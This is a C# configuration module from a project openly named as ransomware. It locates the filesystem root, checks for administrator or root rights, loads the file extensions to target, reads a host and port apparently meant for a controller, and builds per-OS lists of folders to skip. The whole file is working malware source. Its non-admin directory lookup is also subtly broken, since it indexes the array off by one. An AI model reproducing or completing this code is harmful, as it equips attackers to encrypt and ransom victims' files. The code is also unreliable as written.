// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using System.Xml.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Ransomware.Sources.Utils;
static class Config
{
    private static readonly string resources = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources");

    public static string Root() =>
        RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? @"C:\" : "/";

    public static (bool isAdmin, int platform) IsAdmin()
    {
        // 0: Không xác định, 1: Windows, 2: Linux, 3: macOS
        int platformId = 0;
        bool isAdmin = false;
        
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            platformId = 1;
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux) || RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            isAdmin = (Environment.UserName == "root" || Environment.GetEnvironmentVariable("SUDO_USER") != null);
            platformId = RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ? 2 : 3; // 2 cho Linux, 3 cho macOS
        }

        return (isAdmin, platformId);
    }

    public static HashSet<string> Extensions()
    {
        string extensionsConfig = Path.Combine(resources, "extension.xml");
        if (!File.Exists(extensionsConfig)) return new HashSet<string>();

        var extensions = XDocument.Load(extensionsConfig)
            .Descendants("extension")
            .Select(x => x.Value)
            .ToHashSet();

        return extensions.Count > 0 ? extensions : new HashSet<string>();
    }

    public static (string host, int port) Network()
    {
        // Đường dẫn đến tệp cấu hình mạng
        string networkConfig = Path.Combine(resources, "network.xml");

        // Tải tệp XML và lấy phần tử mạng
        var networkElement = XDocument.Load(networkConfig).Element("network")
                            ?? throw new InvalidOperationException("Network configuration is missing.");

        // Lấy giá trị host và port, với giá trị mặc định nếu không có
        string host = networkElement.Element("host")?.Value ?? "127.0.0.1";
        int port = int.TryParse(networkElement.Element("port")?.Value, out int parsedPort) ? parsedPort : 8080;

        return (host, port);
    }

    public static List<string> ExcludedDirectories()
    {
        // Đường dẫn tới file XML
        string filePath = Path.Combine(resources, "directories.xml");

        var xml = XDocument.Load(filePath);
        string userName = Environment.UserName;
        List<string> directories = new List<string>();

        // Lấy danh sách thư mục theo hệ điều hành
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var windowsElement = xml.Root?.Element("Windows");
            if (windowsElement != null)
            {
                directories = windowsElement.Elements("Directory")
                    .Select(x => x.Value.Replace("{UserName}", userName))
                    .ToList();
            }
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
        {
            var linuxElement = xml.Root?.Element("Linux");
            if (linuxElement != null)
            {
                directories = linuxElement.Elements("Directory")
                    .Select(x => x.Value)
                    .ToList();
            }
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            var macosElement = xml.Root?.Element("MacOS");
            if (macosElement != null)
            {
                directories = macosElement.Elements("Directory")
                    .Select(x => x.Value)
                    .ToList();
            }
        }

        (bool isAdmin, int platform) = IsAdmin();
        // Nếu không phải admin, thêm thư mục bỏ qua cho người không phải admin
        if (!isAdmin)
        {
            string[] nonAdminDirKeys = { "NonAdminWin", "NonAdminLinux", "NonAdminMacOS" };

            if (platform >= 1 && platform <= 3) // Kiểm tra xem platform có hợp lệ không
            {
                var nonAdminDirs = xml.Root?.Element(nonAdminDirKeys[platform]);
                if (nonAdminDirs != null)
                {
                    directories.AddRange(nonAdminDirs.Elements("Directory")
                        .Select(x => x.Value)
                        .ToList());
                }
            }
        }

        return directories;
    }
}
